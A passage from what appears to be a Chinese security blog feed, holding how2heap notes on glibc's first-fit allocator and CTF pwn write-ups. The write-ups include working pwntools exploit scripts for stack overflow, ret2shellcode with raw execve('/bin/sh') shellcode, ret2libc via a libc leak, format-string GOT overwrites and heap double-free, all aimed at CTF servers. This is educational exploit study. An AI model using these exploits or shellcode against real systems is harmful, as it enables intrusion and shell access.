class="string">'A'</span>*<span class="number">50</span>+<span class="string">' d'</span>)</span><br><span class="line">        index(<span class="string">'A'</span>*<span class="number">50</span>+<span class="string">' d'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#put one_gadget on stack</span></span><br><span class="line">        one_gadget = libc + <span class="number">0x45216</span></span><br><span class="line">        log.info(<span class="string">'one_gadget: '</span>+ hex(one_gadget))</span><br><span class="line">        payload = <span class="string">'A'</span>*<span class="number">6</span> + p64(one_gadget)</span><br><span class="line">        index(payload.ljust(<span class="number">52</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">        stack = leak_stack() + <span class="number">0x92</span></span><br><span class="line">        libc = leak_libc()</span><br><span class="line">        double_free(stack,libc)</span><br><span class="line">        r.recvuntil(<span class="string">'Quit\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'3'</span>)</span><br><span class="line">        r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">        main()</span><br></pre></td></tr></table></figure><p>参考： <strong><a href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/" target="_blank" rel="noopener">https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/</a></strong></p><p><strong><a href="https://go-madhat.github.io/9447_heap_search-writeup/" target="_blank" rel="noopener">https://go-madhat.github.io/9447_heap_search-writeup/</a></strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> how2heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>first fit</title>
      <link href="/2019/04/13/first-fit/"/>
      <url>/2019/04/13/first-fit/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a>学习记录</p><p><strong>First_fit：Allocate the first chunk that is big enough</strong></p><a id="more"></a><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/first_fit.c" target="_blank" rel="noopener">first_fit.c</a></strong></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>查看first_fit.c的源码可以看到主要进行了申请内存、释放内存再申请内存的三步操作。通过打印指向各个chunk的指针来说明first_fit到底是怎么运作的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">        <span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">        <span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">        <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(a, <span class="string">"this is A!"</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">        c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(c, <span class="string">"this is C!"</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个过程示意图如下：</p><pre><code>+------------+         +------------+         +-------------+|            |         |            |         |             ||            |         |            |         |             ||            |         |            |         |    500      ||    512     |         |   (free)   |         |             ||            |         |     512    |         +-------------+|            | +-----&gt; |            | +-----&gt; |   (free)12  |+------------+         +------------+         +-------------+|            |         |            |         |             ||    256     |         |    256     |         |    256      ||            | +-----&gt; |            | +-----&gt; |             |+------------+         +------------+         +-------------+|            |         |            |         |             ||            |         |            |         |             ||    ...     |         |    ...     |         |     ...     |+            +         +            +         +             +</code></pre><p>因为free chunk中的第一个chunk大小(512)大于申请的chunk大小(500)所以根据first_fit算法，这个512大小的chunk将被分为两部分，一部分返回给用户，大小为500，另一部分依旧留在unsorted bin的双链表结构中。</p><p>下面再举一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">char</span> *d = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">char</span> *e = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"a: %p\n"</span>,a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b: %p\n"</span>,b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c: %p\n"</span>,c);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"d: %p\n"</span>,d);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"e: %p\n"</span>,e);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="built_in">free</span>(e);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"----------after free----------\n"</span>);</span><br><span class="line"><span class="keyword">char</span> *f = <span class="built_in">malloc</span>(<span class="number">0x150</span>);</span><br><span class="line"><span class="keyword">char</span> *g = <span class="built_in">malloc</span>(<span class="number">0x150</span>);</span><br><span class="line"><span class="keyword">char</span> *h = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"f: %p\n"</span>,f);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"g: %p\n"</span>,g);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"h: %p\n"</span>,h);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到的结果：</p><pre><code>a: 0x869d008b: 0x869d210c: 0x869d418d: 0x869d520e: 0x869d628----------after free----------f: 0x869d008g: 0x869d628h: 0x869d418</code></pre><p>申请f chunk时，第一个0x200的chunk大小满足要求，所以使用了第一个a chunk</p><p>申请g chunk时，从上到下依次搜索free chunk中只有e chunk大小满足要求，所以申请到了e chunk</p><p>申请h chunk时，虽然这时e chunk中还剩余0x1b的空间，但由于first_fit，最先搜索到并满足条件的是c chunk，所以h申请到了c chunk。</p><p>示意图如下：</p><pre><code>      +----------+      +----------+      |          |      |          |      |   (free) |  f:  |   0x150  |a:    |   0x200  |      +----------+      |          |      |(free)0xb0|      +----------+      +----------+      |          |      |          |b:    |   0x200  |      |   0x200  |      |          |      |          |      |          | +--&gt; |          |      +----------+      +----------+c:    |  (free)  |      |          |      |   0x100  |  h:  |   0x100  |      +----------+      +----------+d:    |          |      |          |      |   0x100  |      |   0x100  |      +----------+      +----------+      |          |      |          |      |          |      |   0x150  |e:    |  (free)  |      +----------+      |   0x300  |      |          |      |          |  g:  |  (free)  |      |          |      |   0x1b0  |      +----------+      +----------+</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> how2heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ENCRYPTctf</title>
      <link href="/2019/04/03/ENCRYPTctf/"/>
      <url>/2019/04/03/ENCRYPTctf/</url>
      
        <content type="html"><![CDATA[<p>总算碰到一次比较简单的ctf，哭了。</p><p>考察类型：常规栈溢出，leak libc，格式化字符串。</p><a id="more"></a><h1 id="pwn0"><a href="#pwn0" class="headerlink" title="pwn0"></a>pwn0</h1><p>admin：nope, no hint.</p><p><img src="https://i.imgur.com/LjqrkNz.png" alt=""><br>溢出s，覆盖s1。</p><p><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaH!gh</code></p><h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p><img src="https://i.imgur.com/dkLov3a.png" alt=""></p><p>计算偏移，覆盖返回值为<code>shell</code>地址</p><p>坑点在于ebp后面并不是直接跟着ret地址，进gdb可以看到ebp和ret之间有12字节偏移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'104.154.106.182'</span>, <span class="number">2345</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x080484AD</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'a'</span>*<span class="number">12</span> + p32(shell_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><p><img src="https://i.imgur.com/nX9BxJ3.png" alt=""><br>常规检查</p><p><img src="https://i.imgur.com/x9xCBNr.png" alt=""><br>题目给了一个只能执行ls的假shell，没什么用</p><p>找gadgets的时候发现一个<code>jmp esp</code>，加上题目没开NX，所以就ret2shellcode了。</p><p><img src="https://i.imgur.com/10G3O9Z.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">r = remote(&apos;104.154.106.182&apos;, 3456)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">jmp_esp = 0x08048544</span><br><span class="line"></span><br><span class="line">shellcode = &apos;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&apos;</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x20 + &apos;a&apos;*12 + p32(jmp_esp) + shellcode</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h1><p><img src="https://i.imgur.com/OILe3ti.png" alt=""></p><p><img src="https://i.imgur.com/k2j3IK1.png" alt=""><br>这次开了NX，所以想到ret2libc，但是没有system和binsh的地址，所以需要leak。</p><p>思路：</p><p>利用题目本身的<code>puts</code>打印出<strong>plt.got</strong>表中函数的真实地址，在libc-database中找到对应libc库的版本，从而通过计算偏移找到<code>system</code>和<code>binsh</code>的地址，最后ret2libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'104.154.106.182'</span>, <span class="number">4567</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x0804847D</span></span><br><span class="line">puts_plt = <span class="number">0x08048340</span></span><br><span class="line">gets_got = <span class="number">0x080497AC</span></span><br><span class="line">gets_off = <span class="number">0x00064e60</span></span><br><span class="line">system_off = <span class="number">0x00040310</span></span><br><span class="line">binsh_off = <span class="number">0x162d4c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#find gets_addr and then return to main</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'a'</span>*<span class="number">12</span> + p32(puts_plt) + p32(main) + p32(gets_got)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#the low 12bit of gets_addr could help us find it's libc version and func_offset which is all we need</span></span><br><span class="line">gets_addr = int(hex(u32(r.recv()[:<span class="number">4</span>])), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'gets_addr: '</span>+str(hex(gets_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#calc the address of system</span></span><br><span class="line">libc_base =  gets_addr - gets_off</span><br><span class="line">system_addr = libc_base+ system_off</span><br><span class="line">binsh_addr = libc_base + binsh_off</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'system_addr: '</span>+str(hex(system_addr)))</span><br><span class="line">log.success(<span class="string">'binsh_addr: '</span>+str(hex(binsh_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#the last overflow</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'a'</span>*<span class="number">4</span> + p32(system_addr) + <span class="string">'aaaa'</span> + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h1><p><img src="https://i.imgur.com/gmpTIjF.png" alt=""></p><p><img src="https://i.imgur.com/MX5JdGR.png" alt=""></p><p>明显的格式化字符串漏洞。</p><p>一开始函数地址找错了一直拿不到flag，以为构造的payload有问题，差点怀疑人生。</p><p>思路：</p><p>先是找到printf的got.plt表的地址，利用漏洞将其覆盖为题目提供的拿shell函数地址。</p><p>偏移的计算办法：<code>%x.</code>找偏移，有错位就添几个字节补齐，用<code>$[OFFSET]</code>定位偏移后再用<code>%[PADDING]x</code>填充padding个字节，最后用<code>%hhn</code>将前面所有字节个数写入目标地址的单个字节。</p><p>若目标地址单个字节大小小于已写入字节数，则采用溢出：<strong>+0x100-目标值</strong></p><p><img src="https://i.imgur.com/6rO2BSN.png" alt=""><br>嗯对，就是这个地址。一开始找到plt表去了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'104.154.106.182'</span>, <span class="number">5678</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x0804853D</span></span><br><span class="line">printf_got = <span class="number">0x80498fc</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\xfc\x98\x04\x08'</span>+ <span class="string">'\xfd\x98\x04\x08'</span> + \</span><br><span class="line">          <span class="string">'\xfe\x98\x04\x08'</span> + <span class="string">'\xff\x98\x04\x08'</span> + \</span><br><span class="line">         <span class="string">'%45x%7$hhn'</span> + <span class="string">'%72x%8$hhn'</span> + <span class="string">'%127x%9$hhn'</span> + <span class="string">'%4x%10$hhn'</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sunshineCTF</title>
      <link href="/2019/04/01/sunshineCTF/"/>
      <url>/2019/04/01/sunshineCTF/</url>
      
        <content type="html"><![CDATA[<p><strong>return-to-mania</strong> 和 <strong>CyberRumble</strong>，考察普通溢出，还有脑洞。。。。</p><a id="more"></a><h1 id="return-to-mania"><a href="#return-to-mania" class="headerlink" title="return-to-mania"></a>return-to-mania</h1><p><img src="https://i.imgur.com/62pNkcS.png" alt=""></p><p>没开canary，好说</p><p><img src="https://i.imgur.com/og78OMV.png" alt=""><br>进来，看到给出了welcome地址，所以pie相当于没开。</p><p><img src="https://i.imgur.com/48FoCyV.png" alt=""><br>思路：通过偏移计算出maina的地址，覆盖welcome返回地址，拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">r = remote(&apos;ret.sunshinectf.org&apos;,4301)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&apos;(): &apos;)</span><br><span class="line"></span><br><span class="line">mania_addr = int(r.recvuntil(&apos;\n&apos;)[:7]+&apos;65d&apos;, 16)</span><br><span class="line"></span><br><span class="line">print(hex(mania_addr))</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x12 + &apos;aaaa&apos; + p32(mania_addr) </span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">print(r.recv())</span><br></pre></td></tr></table></figure><h1 id="CyberRumble"><a href="#CyberRumble" class="headerlink" title="CyberRumble"></a>CyberRumble</h1><p><img src="https://i.imgur.com/b8nCXPL.png" alt=""><br>全开- -</p><p>整个main由几个不同功能的函数构成，排除掉没什么用的函数，分析一下剩下的几个比较有意思的函数。</p><p>输入每个函数对应的字符串后面加上自己的参数就可以自己选择函数进入了</p><p><strong>tombstone_piledriver</strong>：这个函数将参数作为文件打开，读取其内容并返回给用户。自然想到用来打开flag.txt，可是发现无论如何只能打印flag的前一个单词，所以没办法用它来拿flag。</p><p><strong>old_school</strong>：这个函数接收一串shellcode并返回该shellcode的地址，同时通过<code>mprotect(dest, len, 1);</code>将其权限设置为只读。所以我们并不能直接用这个函数来执行我们的shellcode。</p><p><strong>last_ride</strong>：接收一串shellcommand，并运行。如果我们输入诸如<code>sh</code>之类的shellcommand，发现执行不了，仔细查看伪代码会发现这里有个小漏洞，传给system的参数并不是shellcommand的地址，而是直接将shellcommand传过去了。由此可以联想到通过<strong>old_school</strong>放置我们想要执行的shellcommand，再将其地址作为参数传给<strong>last_ride</strong>。</p><p>还有一个小细节需要注意，就是<strong>old_school</strong>mmap的一块新地址的最后12bit是0，直接使用该地址会导致我们的地址被\x00截断，所以部署shellcommand之前要一小块padding。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'rumble.sunshinectf.org'</span>,<span class="number">4300</span>)</span><br><span class="line"></span><br><span class="line">shellcode_ = <span class="string">'old_school '</span></span><br><span class="line">shellcommand = <span class="string">'last_ride '</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'old_school ash'</span>)</span><br><span class="line"></span><br><span class="line">addr = int(r.recvuntil(<span class="string">'.\n'</span>)[<span class="number">-16</span>:<span class="number">-2</span>], <span class="number">16</span>) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(hex(addr))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'[y/n] '</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'U'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'last_ride '</span> + p64(addr))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/h7j2psy.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UTctf2019</title>
      <link href="/2019/03/13/UTctf2019/"/>
      <url>/2019/03/13/UTctf2019/</url>
      
        <content type="html"><![CDATA[<p>两道题，babypwn和babyecho，分别是ret2shellcode和format+leak libc</p><p>这周末连着两个比赛，酸爽。</p><a id="more"></a><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>docker环境： <strong>docker pull muirelle/utctf:pwn</strong></p><p>想复杂了。老是想着ret2libc，结果discord一个老哥提醒global vireable还是没想起来利用bss段存放shellcode。</p><p><img src="https://i.imgur.com/dW95IHc.png" alt=""><br>保护基本上都没开</p><p><img src="https://i.imgur.com/CycOBQQ.png" alt=""><br><img src="https://i.imgur.com/wRXIMei.png" alt=""><br><img src="https://i.imgur.com/FcNper1.png" alt=""><br>接下来是三个主要的函数。</p><p>注意到<code>welcome</code>和<code>do_calc</code>都可以通过gets进行栈溢出。</p><p><img src="https://i.imgur.com/rTZJokv.png" alt=""></p><p>而name位于bss段，可以将shellcode放在这里，然后劫持<code>do_calc</code>流程跳转到这里执行shellcode。</p><p>从shellstrom上找了一个x64的execve(‘/bin/sh’)</p><p><code>\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</code></p><p>再回来看<code>do_calc</code>函数流程：</p><p>1、输入运算符</p><p>2、输入第一个操作数(nptr)    //[rsp+40h] [rbp-50h]</p><p>3、输入第二个操作数(v1)    //[rsp+0h] [rbp-90h]</p><p>4、依次判断第一步输入的运算符是否是 <strong>+</strong> , <strong>-</strong> , <strong>*</strong> 。若是就直接进行运算然后返回。</p><p>由于nptr离栈底比较近所以选择nptr进行溢出。在溢出的过程中会覆盖v5的值，所以要计算好v5的位置，然后覆盖为运算符。</p><p>计算偏移：0x50-1 = 0x4f</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 